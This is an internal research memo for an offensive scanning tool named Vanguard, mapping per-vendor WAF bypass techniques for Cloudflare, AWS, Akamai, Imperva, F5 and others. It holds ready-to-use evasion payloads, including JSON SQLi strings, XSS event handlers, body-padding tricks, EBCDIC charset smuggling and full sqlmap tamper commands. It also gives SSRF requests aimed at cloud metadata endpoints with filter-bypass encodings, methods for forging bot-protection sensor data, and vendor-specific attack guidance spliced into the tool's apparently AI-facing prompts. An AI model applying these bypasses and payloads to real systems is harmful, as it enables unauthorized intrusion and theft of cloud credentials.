# Research #03 — Vendor-Specific WAF Detection Mechanics

**Date:** 2026-04-25
**Status:** Complete
**Implementation impact:** New `wafsense` module, `vendor_signatures.yaml`, auto-tamper matrix, cookbook prompt addenda per vendor

---

## Executive summary

Modern WAFs in 2025 have converged on a layered model: **(1) edge IP/ASN reputation, (2) TLS fingerprinting (JA3/JA4/JA4H), (3) HTTP/2 SETTINGS + frame ordering, (4) header order canonicalization, (5) signature DB (CRS-derived), (6) ML-driven behavioral scoring**. The exploitable surface for 2025 has shifted away from naive payload obfuscation toward **parser discrepancies (WAFFLED), body size budget exhaustion, and content-type confusion (JSON / XML / multipart)**. Tamper chains alone rarely defeat enterprise WAFs anymore — must be combined with transport-layer tricks (TLS rotation, header injection on trust boundaries) and structural attacks (oversized body, smuggling, unicode normalization).

The single highest-yield 2025 bypass: **8KB body padding for AWS WAF** (8200 A's before payload — all AWS-hosted bug bounty targets confirm this works). For Cloudflare: **JSON SQLi + JA3 rotation via `curl-impersonate-chrome`**. For Akamai: **browser-issued `_abck` cookie seeding via Playwright is mandatory** — without it, no payload works.

### 2. Per-vendor bypass cheat sheet (2025)

#### Cloudflare
- **JSON SQLi** wrapper (Picus): `{"id":{"$ne":null}}` or unicode-escaped JSON values
- **Oversized body**: free/Pro plan inspects only first 128 KB of POST body
- **HTTP/2 → origin HTTP/1.1 smuggling** when origin misconfigured (CL.TE)
- **TLS fingerprint rotation** via `curl-impersonate-chrome` or `tls-client` to mimic Chrome JA3/JA4
- **`cf_clearance` reuse** — once obtained via headless browser, valid 30 min cluster-wide
- **Workers run AFTER WAF** — Workers re-issuing fetches not re-evaluated → SSRF-as-feature

#### AWS WAF
- **Body inspection budget**: pad request body to 8200 bytes; payload after byte 8192 invisible to WAF rules. **#1 reliable AWS WAF bypass in 2025**.
- **JSON body inspection**: when rules inspect `BODY` not `JSON_BODY`, JSON values inspected as single string — `{"x":"u' OR 1=1--"}` evades string-match rules
- **Header inspection limit**: only first 8 KB of headers inspected
- **GraphQL deeply-nested JSON** can crash WAF JSON parser back to "no inspection"
- **Rate-based bypass**: rotate `X-Forwarded-For` per request if rule keys on it

#### Vercel WAF
- Vercel runs **on top of Cloudflare** for many edge regions — CF bypasses pass through
- **Edge Function bypass** — rules apply at edge but Edge Functions execute after
- **`x-vercel-protection-bypass` header** — legitimate bypass for staging; leaked via GitHub history is common
- **Preview URLs** (`*.vercel.app` with hash) often weaker firewall config than production

#### Akamai Kona/AAP
- **Sensor data forging** (`akamai-bypass`, `bm-sz-generator`) — Akamai rotates obfuscation every 4-8 weeks; expect 1-2 week window per release
- **Replay valid `_abck`** — if obtained via real browser, valid hours
- **HTTP/2 fingerprint mimicry** via `curl-impersonate` or patched httpx
- **Double-URL-encoded `..`** still slips on some configs (`%252e%252e%252f`)
- **Origin direct hits** if origin IP leakable via Censys/Shodan TLS cert

#### Imperva
- **HTTP method override**: `X-HTTP-Method-Override: POST` over `GET`
- **Charset trick**: `Content-Type: application/x-www-form-urlencoded; charset=ibm500` (EBCDIC) — payload decoded after WAF inspection
- **Comment injection in MySQL**: `/*!50000UNION*/` style still works on legacy

#### F5 BIG-IP/ASM
- **CVE-2023-46747 / CVE-2024-21762** (unauth RCE) — older but still found unpatched. Pre-check probe.
- **HTTP request smuggling** — TMM historically vulnerable, CL.TE bypass
- **Parameter pollution**: ASM may inspect first occurrence only

#### ModSecurity + CRS
- **CRS rule 920170**: GET with body sometimes bypasses (PL-dependent)
- **Comment evasion**: `/*!*/`, `%0b`, tab-based breaks
- **JSON body without `Content-Type: application/json`** — many CRS deployments only inspect bodies based on declared Content-Type

#### Sucuri
- **Origin IP discovery via SecurityTrails** — Sucuri does not enforce origin allowlist by default. Often sufficient.

### 3. Detection probes (4-5 requests reliably fingerprint)

```
PROBE 1 (passive):  HEAD / HTTP/1.1
  → Inspect: Server, Set-Cookie, all x-* headers, via, cf-ray, x-amz-cf-id,
            x-akamai-*, x-iinfo, x-sucuri-*, x-vercel-*, x-sigsci-*, x-rbz-*

PROBE 2 (SQLi):     GET /?id=1%27%20UNION%20SELECT%20NULL--%20 HTTP/1.1
  → Inspect: status, body keywords, cf-mitigated, x-amzn-ErrorType,
            "Reference #18.", "Incapsula incident", "Sucuri",
            "Support ID:", "Vercel Security Checkpoint", "mod_security"

PROBE 3 (XSS):      GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
  → Same matches; XSS triggers different rule IDs and confirms WAF presence

PROBE 4 (path):     GET /.env, /admin, /wp-admin/ HTTP/1.1
  → Triggers ATT&CK + admin-panel rules

PROBE 5 (HTTP/2):   client_hello with custom JA3 mismatch
  → Cloudflare cf-mitigated:challenge confirms JA3 enforcement is on
```

### 5. Fresh cross-vendor 2024-2025 bypasses

- **WAFFLED (Aug 2024, Zafran Labs)** — parser discrepancies between WAF and origin in `Content-Type`, `Transfer-Encoding`, multipart parsing. Affects CF, AWS WAF, Imperva, F5.
- **JSON SQLi (Picus, refreshed 2024)** — `{"id":{"$ne":1}}`, unicode-escaped JSON values
- **Body inspection budget** — every WAF has size limit (AWS 8KB, CF 128KB Pro, Akamai configurable, Imperva 1MB)
- **HTTP/2 → H/1.1 downgrade smuggling** — James Kettle ongoing; H2 frame manipulation becomes CL.TE at origin
- **Modern XSS event handlers** — `onpointerrawupdate`, `onbeforetoggle`, `<details open ontoggle>`
- **Unicode normalization** — `ʼ` (U+02BC), `′` (U+2032), full-width `＇` (U+FF07) for `'` substitution
- **Mass assignment via JSON merge patch** — `application/merge-patch+json` (RFC 7396) often passes WAF rules tuned only for `application/json`
- **Cache deception 2024 variants** — `/profile/avatar.css` paths
- **JA4 fingerprint mismatch** — ALL major WAFs adopted JA4 in 2024 — use `tls-client` (golang) or `curl-impersonate-chrome v126+`
- **Cloudflare Workers bypass** — Workers route runs after WAF; re-issued fetches not re-evaluated → SSRF-as-feature

### 6. Vanguard cookbook prompt addenda per vendor

When WAF detection fires, append vendor-specific guidance to cookbook prompts:

**`vuln-injection.txt` on Cloudflare:**
> Use sqlmap with `--tamper=between,charunicodeencode,equaltolike,greatest,nonrecursivereplacement,percentage,randomcase,space2comment,unionalltounion,unmagicquotes --random-agent --delay=0.5 --threads=2 --technique=B`. Try JSON-body SQLi: `{"id":{"$ne":null}}`. Avoid error-based; use boolean-blind/time-based. Pad body >128KB on Pro plans. Rotate JA3 with `curl-impersonate-chrome`.

**`vuln-injection.txt` on AWS WAF:**
> Body inspection limit = 8KB default. Pad request body with 8200 A's before payload: `--prefix='AAAA...(8200)AAAA&' --data='id=1'`. Prefer JSON_BODY rules misconfig: send body as flat string not JSON. Try GraphQL deeply-nested payloads. Rate-based: rotate `X-Forwarded-For` per request.

**`vuln-xss.txt` on Akamai:**
> Browser-issued `_abck` cookie REQUIRED. Seed session via Playwright once, reuse cookie ~1h. Use payloads: `<details open ontoggle=alert(1)>`, `<svg onpointerrawupdate=...>`. Header order matters — match Chrome's H2 SETTINGS via `curl-impersonate`.

**`vuln-injection.txt` on Imperva:**
> Try EBCDIC charset: `Content-Type: application/x-www-form-urlencoded; charset=ibm500`. Use `modsecurityversioned` tamper for legacy MySQL: `/*!50000UNION*/`. Method override: `X-HTTP-Method-Override: POST` on GET. Look for `x-iinfo` header — encodes block decision (useful for blind feedback).

**`vuln-ssrf.txt` on AWS:**
> Try IMDSv1 directly: `http://169.254.169.254/latest/meta-data/`. DNS rebinding: `169.254.169.254.nip.io`. Filter bypasses: decimal `2852039166`, hex `0xa9fea9fe`, IPv6-mapped `::ffff:a9fe:a9fe`. GCP: `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`.

## Implementation decisions

| Decision | Rationale | Implementation |
|---|---|---|
| New `wafsense` module | First pre-attack action | New `vanguard/wafsense.cjs` script |
| `vendor_signatures.yaml` data file | Vendors rotate quarterly | Versioned data asset |
| Probe with H1 AND H2 | Detect layered WAFs (Vercel-on-CF) | Both protocol probes |
| Tamper matrix | Auto-select per WAF + class | `tamper_matrix.yaml` config |
| Playwright cookie seeder | Akamai/CF require browser-issued `_abck`/`cf_clearance` | New `cookie-seeder.cjs` script |
| Body-padding as first-class scan option | sqlmap doesn't pad cleanly | Wrap requests in Vanguard's HTTP layer |
| Cookbook prompt addenda per vendor | Inject vendor-specific guidance | Append to `vuln-*.txt` at runtime |
| `curl-impersonate-chrome` as Vanguard dependency | TLS impersonation table stakes | Bundle in install |
| Always test CVE-2023-46747 / 2024-21762 if F5 detected | Pre-RCE check | Auto-probe in F5 path |

**Top 3 highest-yield techniques to prioritize in adaptive payload list:**
1. WAFFLED parser discrepancies
2. AWS WAF body padding (8KB)
3. Cloudflare JSON SQLi

## Open questions

1. **Vercel Firewall API surface** — actively evolving (GA late 2024); monitor `vercel.com/changelog` for new rule types
2. **JA4H matching cost** — full per-request JA4H matching may slow scans; profile and decide if always-on or detection-triggered
3. **Sensor data forging maintenance** — Akamai rotates obfuscation every 4-8 weeks. Maintenance burden vs always require Playwright cookie seed?
4. **Origin direct discovery** — should Vanguard auto-attempt origin direct (Censys/SecurityTrails lookup) as a WAF bypass?
5. **WAF-evasion vs OPSEC-friendly** — aggressive bypasses are loud. Trade off in OPSEC profile?
